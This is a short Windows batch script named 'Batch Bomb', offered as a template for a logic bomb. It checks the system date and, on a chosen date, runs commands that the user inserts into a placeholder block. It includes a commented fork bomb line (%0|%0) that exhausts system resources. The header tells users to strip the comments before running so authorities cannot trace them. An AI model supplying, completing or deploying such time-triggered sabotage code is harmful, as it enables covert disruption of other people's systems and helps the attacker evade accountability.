:: Title - Batch Bomb
:: Author - Draco
:: Version - 1.0
:: Description - Runs commands when ran if system date==set date, exits. Modify "TARGET_DATE=" and insert commands in the specified block.
:: Delete commented lines before runnning (can't have the feds on me)

@echo off
setlocal

set "TARGET_DATE=MM/DD/YYYY"

for /f "tokens=2 delims= " %%A in ('echo %DATE%') do set "CUR_DATE=%%A"

if "%CUR_DATE%"=="%TARGET_DATE%" (
    <Insert Commands Here>
:: %0|%0
)

exit /b
